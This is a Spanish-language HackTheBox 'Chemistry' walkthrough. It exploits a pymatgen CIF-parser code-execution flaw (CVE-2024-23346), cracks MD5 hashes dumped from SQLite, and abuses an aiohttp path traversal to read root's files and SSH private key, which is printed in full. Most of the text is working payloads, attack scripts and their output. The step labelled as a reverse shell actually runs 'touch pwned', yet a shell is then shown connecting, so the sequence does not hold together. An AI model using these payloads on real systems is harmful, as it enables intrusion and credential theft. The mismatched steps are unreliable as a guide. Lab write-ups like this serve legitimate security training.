---
title: "HackTheBox - Chemistry"
date: 2025-03-10
tags: ["Linux", "CIF-Parser", "CVE-2024-23346", "SQLite", "CVE-2024-23342", "Aiohttp"]
platform: "hackthebox"
logo: "/images/htb.png"
summary: "Resolución de la máquina Chemistry. Explotaremos una ejecución remota de comandos (RCE) en un analizador de archivos CIF, realizaremos cracking de hashes MD5 de una base de datos SQLite y escalaremos privilegios mediante un Path Traversal en un servicio local de aiohttp."
---


Esto es una maquina de [[HackTheBox]] y aquí realizaremos por pasos como realizarla:

Lo primero que deberemos de hacer es hacerle [[Ping]] a la maquina para saber si esta esta conectada o no.
```sh title:Shell
ping -c 1 [IP_OBJETIVO]
```

Después de saber que la maquina esta operativa y estamos conexión a ella lo que haremos es establecer nuestro entorno de trabajo:
```sh title:Shell
mkdir Chemistry 
cd Chemistry 
mkt
ll
drwxr-xr-x root root 0 B Mon Mar 10 08:22:54 2025  content
drwxr-xr-x root root 0 B Mon Mar 10 08:22:54 2025  exploits
drwxr-xr-x root root 0 B Mon Mar 10 08:22:54 2025  nmap
drwxr-xr-x root root 0 B Mon Mar 10 08:22:54 2025  scripts
```

Ahora una ves creado nuestro entorno de trabajo lo que haremos es la realizar nuevamente un [[Ping]] para saber a que tipo de sistema operativo nos enfrentamos en cuestión.
```sh title:Shell
ping -c 1 [IP_OBJETIVO]
PING 10.10.11.38 (10.10.11.38) 56(84) bytes of data.
64 bytes from 10.10.11.38: icmp_seq=1 ttl=63 time=334 ms

--- 10.10.11.38 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 333.609/333.609/333.609/0.000 ms
```
 Por el valor del [[TTL]] sabemos que la maquina que nos estamos enfrentado es una maquina [[Linux]] = 64.

Con un comando que tenemos puesto una ruta absoluta <font color="#9bbb59">/usr/local/bin/</font>[[whichSystem.py]] de nuestro equipo podemos saber mejor que [[Sistema Operativo]] es al cual no estamos enfrentando.

```sh title:Shell
whichSystem.py
	10.10.11.38 (ttl -> 63): Linux
```

Ahora una vez hecho el escaneo principal de la maquina Objetivo, lo que procedemos a usar [[0 Ciberseguridad/1 Herramientas y Conceptos/Nmap/Nmap|Nmap]] para saber los [[Puerto]] que pueden ser vulnerables.

```sh title:Shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn [IP_OBJETIVO] -oG Allports
```

Una vez realizado esto usaremos [[ExtractPorts]]:

```sh title:Shell
extractPorts Allports
───────┬───────────────────────────────────────────────────────────────────
       │ File: extractPorts.tmp
───────┼───────────────────────────────────────────────────────────────────
		  [*] Extracting information...
			[*] IP Address: 10.10.11.38
			[*] Open ports: 22,5000  
		  [*] Ports copied to clipboard
```

Una vez extraídos los [[Puerto]] que tenemos habilitados en esta maquina lo que procedemos a hacer es un nuevo escaneo [[0 Ciberseguridad/1 Herramientas y Conceptos/Nmap/Nmap]]:

```sh title:Shell
nmap -p22,5000 -sCV 10.10.11.38 -oN targeted
```

Con esto podemos ver las versiones de los servicios que corren por los [[Puerto]] Habilitados 
y con ello podemos ver que versión de [[Linux]] nos enfrentamos.

Sabiendo que el [[Puerto]] 5000 esta habilitado podemos hacer un [[Curl]] para saber si esat nos da respuesta y saber si hay una pagina web alojada.

```sh title:Shell
curl -s 10.10.11.38:5000
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Chemistry - Home</title>
    <link rel="stylesheet" href="/static/styles.css">
</head>
<body>
    
      
    
    <div class="container">
        <h1 class="title">Chemistry CIF Analyzer</h1>
        <p>Welcome to the Chemistry CIF Analyzer. This tool allows you to upload a CIF (Crystallographic Information File) and analyze the structural data contained within.</p>
        <div class="buttons">
            <center><a href="/login" class="btn">Login</a>
            <a href="/register" class="btn">Register</a></center>
        </div>
    </div>
</body>
</html>#  
```

Y como podemos ver nos da una respuesta de que si existe una pagina web alojada en el [[Puerto]] 5000 con ello podemos emplear [[HTML2Text]] en el [[Curl]]:

```sh title:Shell
curl -s 10.10.11.38 | html2text

****** Chemistry CIF Analyzer ******
Welcome to the Chemistry CIF Analyzer. This tool allows you to upload a CIF
(Crystallographic Information File) and analyze the structural data contained
within.
                                Login Register
```

 Esto lo que hace es darnos los datos mas relevantes de la pagina web.

Ahora podemos emplear un [[WhatWeb]] para ver lo que puede estar corriendo detrás de la pagina web.

```sh title:Shell
whatweb http://10.10.11.38:5000
```

`{css title:whatweb} http://10.10.11.38:5000 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/3.0.3 Python/3.9.5], IP[10.10.11.38], Python[3.9.5], Title[Chemistry - Home], Werkzeug[3.0.3]`

Una vez realizado esto lo que procedemos a hacer es visitar la pagina web en el [[Firefox]].

![[Pasted image 20250310105052.png]]

Nos podemos registrar y nos sale la opción de poder enviar un **Archivo.cif**.

![[Pasted image 20250310120806.png]]

Lo que podemos hacer ahora es buscar en el propio [[Firefox]] si hay algún tipo de vulnerabilidad en los archivos **.cif**. Y como podemos observar hay un repositorio [[GitHub]] que nos proporciona un exploit para los archivos **.cif*.

`https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f`

Con este repositorio copiamos el código que nos proporciono y lo añadimos a un archivo creado por nosotros mismo llamado **test.cif**.

```sh title:Shell
nvim test.cif
```

Le añadimos al archivo lo siguiente para que este nos proporcione un [[Ping]]

```sh title:Shell
data_5yOhtAoR
_audit_creation_date            2018-06-08
_audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"

loop_
_parent_propagation_vector.id
_parent_propagation_vector.kxkykz
k1 [0 0 0]

_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("ping -c 1 10.10.14.52");0,0,0'


_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
```

y abrimos otra [[Terminal]] para escuchar por el puerto tun0 que es el que esta conectado a mi [[VPN]].

```sh title:Shell
tcpdump -i tun0 icmp -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
12:32:21.787113 IP 10.10.11.38 > 10.10.14.52: ICMP echo request, id 3, seq 1, length 64
12:32:21.787125 IP 10.10.14.52 > 10.10.11.38: ICMP echo reply, id 3, seq 1, length 64
```

Vemos que nos hizo [[Ping]], y ahora lo que podemos hacer es hacernos una [[Reverse Shell]] en el archivo **.cif** para conectarnos a la [[Terminal]] de la maquina Objetivo.

```sh title:Shell
nvim test.cif

data_5yOhtAoR
_audit_creation_date            2018-06-08
_audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"

loop_
_parent_propagation_vector.id
_parent_propagation_vector.kxkykz
k1 [0 0 0]

_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("touch pwned");0,0,0'


_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "

```

Y antes de depositar el Archivo **.cif** en la pagina web para que lo detecte lo que haremos es abrir de forma paralela una nueva [[Terminal]] con la que haremos un [[Netcat]] por el [[Puerto]] 443

```sh title:Shell
nc -nlvp 443
```

Procedemos a enviar y después darle a view para que este se ejecute.

![[Pasted image 20250310125726.png]]

Una vez enviado el archivo **.cif** lo que procedemos hacer es observar si el [[Netcat]] tuvo efecto.

```sh title:Shell 
nc -nlvp 443
listening on [any] 443 ...

connect to [10.10.14.52] from (UNKNOWN) [10.10.11.38] 33670
bash: cannot set terminal process group (2430): Inappropriate ioctl for device
bash: no job control in this shell
app@chemistry:~$ 
app@chemistry:~$ 
```

Una vez conectado a la maquina lo que procedemos a hacer es inspeccionar lo que nos podría ser útil para [[Escalar Privilegios]] y también haremos que la [[Reverse Shell]] se nos quede de manera que parezca lo mas parecido a nuestra [[Terminal]] y hacerla una [[Consola interactiva]].

```sh title:Shell
app@chemistry:~$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
app@chemistry:~$ 
```

Despues en nuestra [[Terminal]] realizamos lo siguiente :

```sh title:Shell
stty raw -echo; fg
			reset xterm
```

Para que la [[Consola interactiva]] que no hemos hecho tenga las misma funciones que nuestra [[Terminal]] lo que tenemos que hacer es lo siguiente:

```sh title:Shell
export TERM=xterm
stty rows 43 columns 184
```

Así tenemos la [[Consola interactiva]] como si fuese nuestra [[Terminal]].

Ahora una vez dentro lo que procedemos ha realizar es una inspección a los archivos que tiene esta maquina y podemos ver que con el comando **ls** podemos ver que hay un archivo [[Python]] y con eso nos podemos meter para ver lo que puede haber dentro para saber que podemos realizar en un futuro.

```sh title:Shell
app@chemistry:~$ ls
app.py  instance  static  templates  uploads
nano app.py

  GNU nano 4.8                                                                             app.py                                                      ##Esto solo es una parte que nos interesa.
app = Flask(__name__)
app.config['SECRET_KEY'] = 'MyS3cretCh3mistry4PP'
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///database.db'
app.config['UPLOAD_FOLDER'] = 'uploads/'
app.config['ALLOWED_EXTENSIONS'] = {'cif'}

db = SQLAlchemy(app)
login_manager = LoginManager(app)
login_manager.login_view = 'login'

```

Como podemos apreciar en el archivo **app.py** que están usando [[SQLite]] para alojar datos, eso es algo muy interesante, ya que esto nos permitirá tener accesos las [[Databases]] de la maquina Objetivo.

Por lo tanto lo que realizaremos ahora es un comando para saber donde esta alojado dicho programa.

```sh title:Shell
app@chemistry:~$ find . -name database.db
./instance/database.db
app@chemistry:~$ ^C
app@chemistry:~$ file ./instance/database.db
./instance/database.db: SQLite 3.x database, last written using SQLite version 3031001
```

Una vez sabemos que SQLite3 esta en esa estancia lo que podemos hacer es lo siguiente:

```sh title:Shell
app@chemistry:~$ sqlite3 ./instance/database.db
SQLite version 3.31.1 2020-01-27 19:55:54
Enter ".help" for usage hints.
sqlite> .tables
structure  user 
sqlite> select * from user;
1|admin|2861debaf8d99436a10ed6f75a252abf
2|app|197865e46b878d9e74a0346b6d59886a
3|rosa|63ed86ee9f624c7b14f1d4f43dc251a5
4|robert|02fcf7cfc10adc37959fb21f06c6b467
5|jobert|3dec299e06f7ed187bac06bd3b670ab2
6|carlos|9ad48828b0955513f7cf0f7f6510c8f8
7|peter|6845c17d298d95aa942127bdad2ceb9b
8|victoria|c3601ad2286a4293868ec2a4bc606ba3
9|tania|a4aa55e816205dc0389591c9f82f43bb
10|eusebio|6cad48078d0241cca9a7b322ecd073b3
11|gelacia|4af70c80b68267012ecdac9a7e916d18
12|fabian|4e5d71f53fdd2eabdbabb233113b5dc0
13|axel|9347f9724ca083b17e39555c36fd9007
14|kristel|6896ba7b11a62cacffbdaded457c6d92
15|hjg|abe13ce258f6eda2607f89d65701af7f
16|root|5f4dcc3b5aa765d61d8327deb882cf99
17|user|ee11cbb19052e40b07aac0ca060c23ee
18|hello|5d41402abc4b2a76b9719d911017c592
19|test|16d7a4fca7442dda3ad93c9a726597e4
sqlite> 
```

**Con esto tenemos Usuarios potenciales para estar subiendo de privilegios .**

Ahora con los [[Hash]]es que tenemos lo que podemos hacer es usar la herramienta de [[CrackStation]] para resolver las posibles contraseñas que nos proporciono [[SQLite]].

Lo que hacemos es lo siguiente en nuestra [[Terminal]] para asi conseguir solo las credenciales de las contraseñas para así poderlas poner en [[CrackStation]].

```sh title:Shell
echo '
1|admin|2861debaf8d99436a10ed6f75a252abf
2|app|197865e46b878d9e74a0346b6d59886a
3|rosa|63ed86ee9f624c7b14f1d4f43dc251a5
4|robert|02fcf7cfc10adc37959fb21f06c6b467
5|jobert|3dec299e06f7ed187bac06bd3b670ab2
6|carlos|9ad48828b0955513f7cf0f7f6510c8f8
7|peter|6845c17d298d95aa942127bdad2ceb9b
8|victoria|c3601ad2286a4293868ec2a4bc606ba3
9|tania|a4aa55e816205dc0389591c9f82f43bb
10|eusebio|6cad48078d0241cca9a7b322ecd073b3
11|gelacia|4af70c80b68267012ecdac9a7e916d18
12|fabian|4e5d71f53fdd2eabdbabb233113b5dc0
13|axel|9347f9724ca083b17e39555c36fd9007
14|kristel|6896ba7b11a62cacffbdaded457c6d92
15|hjg|abe13ce258f6eda2607f89d65701af7f
16|root|5f4dcc3b5aa765d61d8327deb882cf99
17|user|ee11cbb19052e40b07aac0ca060c23ee
18|hello|5d41402abc4b2a76b9719d911017c592
19|test|16d7a4fca7442dda3ad93c9a726597e4' | awk '{print $3}' FS="|"

2861debaf8d99436a10ed6f75a252abf
197865e46b878d9e74a0346b6d59886a
63ed86ee9f624c7b14f1d4f43dc251a5
02fcf7cfc10adc37959fb21f06c6b467
3dec299e06f7ed187bac06bd3b670ab2
9ad48828b0955513f7cf0f7f6510c8f8
6845c17d298d95aa942127bdad2ceb9b
c3601ad2286a4293868ec2a4bc606ba3
a4aa55e816205dc0389591c9f82f43bb
6cad48078d0241cca9a7b322ecd073b3
4af70c80b68267012ecdac9a7e916d18
4e5d71f53fdd2eabdbabb233113b5dc0
9347f9724ca083b17e39555c36fd9007
6896ba7b11a62cacffbdaded457c6d92
abe13ce258f6eda2607f89d65701af7f
5f4dcc3b5aa765d61d8327deb882cf99
ee11cbb19052e40b07aac0ca060c23ee
5d41402abc4b2a76b9719d911017c592
16d7a4fca7442dda3ad93c9a726597e4
```

Y en [[CrackStation]] metemos los [[Hash]]es y esto es lo que nos sale:

![[Pasted image 20250310135236.png]]

Aquí nos proporciono [[CrackStation]] un numero de contraseñas potenciales para acceder a algún usuario.

Esto también se podría haber realizado de manera Local en nuestra [[Terminal]], ya que podíamos deducir que podría ser [[Hash MD5]] y con el siguiente comando:

```sh title:Shell
nvim contraseñas.txt
##Añadir todo el listado de los Hashes
hashcat -m 0 -a 0 contraseñas.txt /usr/share/wordlists/rockyou.txt --force
hashcat (v6.2.6) starting

You have enabled --force to bypass dangerous warnings and errors!
This can hide serious problems and should only be done when debugging.
Do not report hashcat issues encountered when using --force.

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: pthread-skylake-avx512-11th Gen Intel(R) Core(TM) i7-11800H @ 2.30GHz, 2899/5862 MB (1024 MB allocatable), 2MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 19 digests; 19 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

5f4dcc3b5aa765d61d8327deb882cf99:password                 
5d41402abc4b2a76b9719d911017c592:hello                    
9ad48828b0955513f7cf0f7f6510c8f8:carlos123                
16d7a4fca7442dda3ad93c9a726597e4:test1234                 
6845c17d298d95aa942127bdad2ceb9b:peterparker              
c3601ad2286a4293868ec2a4bc606ba3:victoria123              
63ed86ee9f624c7b14f1d4f43dc251a5:unicorniosrosados 
```

Y para identificarlos nos deja la contraseña resuelta y con el [[Hash]] al lado para poder asi identificar de cual usuario es la contraseña que nos proporcionó.

Sabiendo ya la contraseñas de los usuarios, mediante [[SSH]] podemos entrar a la maquina con mayor facilidad y así conseguir la flag de **user.txt**

```sh title:Shell
ssh rosa@10.10.11.38
rosa@10.10.11.38's password: 
--Texto de SSH--
rosa@chemistry:~$ ls
user.txt
rosa@chemistry:~$ cat user.txt 
028d4e71aa5957e539e9a5c0d5f5e1d4
```

Ya conectado a la maquina lo que queremos ahora es hacer una Escalada de Privilegios.

Una de las cosas que podemos hacer para saber si nuestro usuario tiene algún [[Privilegio SUID]] con el siguiente comando:

```sh title:Shell
rosa@chemistry:~$ find / -perm -4000 2>/dev/null
/snap/snapd/21759/usr/lib/snapd/snap-confine
/snap/core20/2379/usr/bin/chfn
/snap/core20/2379/usr/bin/chsh
/snap/core20/2379/usr/bin/gpasswd
/snap/core20/2379/usr/bin/mount
/snap/core20/2379/usr/bin/newgrp
/snap/core20/2379/usr/bin/passwd
/snap/core20/2379/usr/bin/su
/snap/core20/2379/usr/bin/sudo
/snap/core20/2379/usr/bin/umount
/snap/core20/2379/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/2379/usr/lib/openssh/ssh-keysign
/usr/bin/umount
/usr/bin/fusermount
/usr/bin/sudo
/usr/bin/at
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/chfn
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
```

Aquí se puede apreciar que no sale nada fuera de lo común.

También podremos [[Listar Capabilities]] desde las [[Raiz]] para inspeccionar mas.

```sh title:Shell
rosa@chemistry:~$ getcap -r / 2>/dev/null
/snap/core20/2379/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/ping = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```

Esto no es nada fuera de lo normal. ya que esto no nos deja hacer nada en especial con ello.

Ahora lo que podemos ver que hay detrás de la maquina mirando los Procesos:

```sh title:Shell
ps -faux
## Sale muchos procesos que no nos sirven, pero destacamos uno que nos puede servir
root        1073  0.0  2.4 424784 48912 ?        Ssl  Mar10   0:22 /usr/bin/python3.9 /opt/monitoring_site/app.py
cat /opt/monitoring_site/app.py
cat: /opt/monitoring_site/app.py: Permission denied
```

Lo que podemos ver es que si se están empleando otros puertos, ya que la ejecución de **app.py** no es el mismo servicio al cual nosotros usamos para acceder.

```sh title:Shell
rosa@chemistry:~$ ss -nltp
State                 Recv-Q                Send-Q                               Local Address:Port                               Peer Address:Port               Process               
LISTEN                0                     4096                                 127.0.0.53%lo:53                                      0.0.0.0:*                                        
LISTEN                0                     128                                        0.0.0.0:22                                      0.0.0.0:*                                        
LISTEN                0                     128                                        0.0.0.0:5000                                    0.0.0.0:*                                        
LISTEN                0                     128                                      127.0.0.1:8080                                    0.0.0.0:*                                        
LISTEN                0                     128                                           [::]:22                                         [::]:*    
```

Vemos que hay nuevos puertos que no lo detectamos con [[0 Ciberseguridad/1 Herramientas y Conceptos/Nmap/Nmap]] esto es interesante, ya que podemos hacer un [[Curl]] para saber que hay.

```sh title:Shell
curl localhost:8080
## Tambien podemos ver la cabeceras de repuestas
curl localhost:8080 -I
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 5971
Date: Tue, 11 Mar 2025 12:15:01 GMT
Server: Python/3.9 aiohttp/3.9.1
```

Con esto podemos ver si el [[Python]]/3.9 aiohttp/3.9.1 tiene algún tipo de vulnerabilidad como caundo comprobamos los servicios de los puertos abiertos.

![[Pasted image 20250311122558.png]]

![[Pasted image 20250311122816.png]]

Nos metemos y vemos el [[Exploit]].sh que tiene el Repositorio [[GitHub]] donde dice ser que hay una vulnerabilidad en [[Python]]/3.9 aiohttp/3.9.1.

```sh title:Bash
#!/bin/bash

url="http://localhost:8081"
string="../"
payload="/static/"
file="etc/passwd" # without the first /

for ((i=0; i<15; i++)); do
    payload+="$string"
    echo "[+] Testing with $payload$file"
    status_code=$(curl --path-as-is -s -o /dev/null -w "%{http_code}" "$url$payload$file")
    echo -e "\tStatus code --> $status_code"
    
    if [[ $status_code -eq 200 ]]; then
        curl -s --path-as-is "$url$payload$file"
        break
    fi
done
```

Con esto podemos ver lo que hace para que [[Python]]/3.9 aiohttp/3.9.1 sea vulnerable y como con esto que lo tiene alojado el [[Root]] podemos de alguna manera a los contenidos que tienen alojado en el /[[Root]] y así poder coger la [[Root]].txt.

Lo puntos claves de este [[Exploit]] son los siguientes puntos en cuestión:

```sh title:Bash
url="http://localhost:8081"
string="../"
payload="/static/"
file="etc/passwd"

payload+="$string"

status_code=$(curl --path-as-is -s -o /dev/null -w "%{http_code}" "$url$payload$file")
```

Con esto podemos sonsacar que la vulnerabilidad en cuestión de [[Python]]/3.9 aiohttp/3.9.1 se podría sacar con lo siguiente, ya que como hemos visto anteriormente [[Root]] estaba corriendo **app.py** que este podría ser el servicio que se esta corriendo por el [[Puerto]] **8080**:

Prueba para ver si funciona:

```sh title:Shell
curl -s -X GET "http://localhost:8080/assets/../../../../etc/passwd" --path-as-is
## Se puede ver el /etc/passwd
root:x:0:0:root:/root:/bin/bash
```

Ya una vez viendo que este [[Exploit]] funciona lo que podemos hacer es ver la **Flag** [[Root]].txt o también lo que podemos hacer es descargar la clave de [[RSA]] para poder acceder a la maquina desde [[SSH]] con el usuario [[Root]].

Como seria conseguir solo la **Flag** con este [[Exploit]]:

```sh title:Shell
rosa@chemistry:~$ curl -s -X GET "http://localhost:8080/assets/../../../../root/root.txt" --path-as-is
3343c681d871dfc80713a675982e3c84
```

Como seria conseguir la Id_[[RSA]] del Usuario [[Root]] para asi porder conectarnos por [[SSH]].

```sh title:Shell
curl -s -X GET "http://localhost:8080/assets/../../../../root/.ssh/id_rsa" --path-as-is
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

Añadiendole al final del [[Curl]] lo suiguiente:

```sh title:Shell
curl -s -X GET "http://localhost:8080/assets/../../../../root/.ssh/id_rsa" --path-as-is > /tmp/id_rsa
## > /tmp/id_rsa es para tranferir la id_rsa al usuario rosa al directorio /tmp
```

Por consiguiente lo que tenemos que hacer quitar le los permisos para que solo el propietario lo pueda escribir para prevenir los típicos errores por privilegios:

```sh title:Shell
rosa@chemistry:/tmp$ chmod 600 id_rsa
rosa@chemistry:/tmp$ ls -l id_rsa
-rw------- 1 rosa rosa 2602 Mar 11 12:57 id_rsa
```

Ahora solo lo que tenemos que hacer es conectarnos por [[SSH]] como [[Root]].

```sh title:Shell
rosa@chemistry:/tmp$ ssh -i id_rsa root@10.10.11.38
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-196-generic x86_64)
## Omiti el Texto que proporciona SSH
root@chemistry:~# cat root.txt 
3343c681d871dfc80713a675982e3c84
```

---
